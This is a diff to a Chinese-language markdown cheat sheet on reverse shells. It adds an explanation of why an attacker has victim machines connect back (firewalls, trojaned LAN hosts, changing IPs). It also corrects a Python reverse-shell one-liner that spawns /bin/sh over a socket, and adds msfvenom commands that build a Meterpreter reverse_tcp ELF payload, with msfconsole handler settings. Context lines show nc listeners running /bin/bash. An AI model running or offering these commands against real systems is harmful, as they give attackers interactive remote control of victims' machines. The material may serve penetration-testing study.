@@ -6,6 +6,22 @@
 2. 文件重定向符 `` > <``
 3. 环境变量 ``${}``
 
+## 关于反弹shell
+
+通常用于被控端因防火墙受限、权限不足、端口被占用等情形
+
+假设我们攻击了一台机器，打开了该机器的一个端口，攻击者在自己的机器去连接目标机器（目标ip：目标机器端口），这是比较常规的形式，我们叫做正向连接。远程桌面，web服务，ssh，telnet等等，都是正向连接。那么什么情况下正向连接不太好用了呢？
+
+1.某客户机中了你的网马，但是它在局域网内，你直接连接不了。
+
+2.它的ip会动态改变，你不能持续控制。
+
+3.由于防火墙等限制，对方机器只能发送请求，不能接收请求。
+
+4.对于病毒，木马，受害者什么时候能中招，对方的网络环境是什么样的，什么时候开关机，都是未知，所以建立一个服务端，让恶意程序主动连接，才是上策。
+
+攻击者指定服务端，受害者主机主动连接攻击者的服务端程序
+
 ## PHP
 
 一句话：
@@ -63,7 +79,7 @@ if command -v python > /dev/null 2>&1; then python -c 'import socket,subprocess,
 ## Python
 
 ```python
-python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("127.0.0.1",1234));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);
+python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("127.0.0.1",1234));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
 ```
 
 ## Perl
@@ -95,6 +111,23 @@ nc -lvvp 2333 -e /bin/bash
 ```
 nc ip 2333
 ```
+
+## msf 马
+
+```bash
+msfvenom -p linux/x86/meterpreter/reverse_tcp lhost={IP} lport={PORT} -f elf -o shell
+```
+
+```bash
+msfconsole
+use exploit/multi/handler
+set payload windows/x64/meterpreter/reverse_tcp
+set lhost 192.168.187.130
+set lport 4444
+
+exploit
+```
+
 ## 获取Bash交互行
 
 ```
